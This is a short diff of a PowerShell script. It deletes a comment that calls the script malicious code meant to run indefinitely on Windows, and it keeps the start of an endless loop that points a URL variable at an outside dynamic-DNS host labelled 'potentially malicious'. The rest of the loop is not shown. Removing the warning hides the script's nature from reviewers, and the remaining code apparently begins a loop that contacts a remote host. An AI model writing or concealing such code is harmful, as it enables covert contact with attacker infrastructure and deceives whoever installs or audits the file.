@@ -1,5 +1,3 @@
-# This script appears to be a piece of malicious PowerShell code designed to run indefinitely on a Windows system.
-
 do {
     # Set the URL to a potentially malicious site
     $url = "http://netman.servehttp.com";
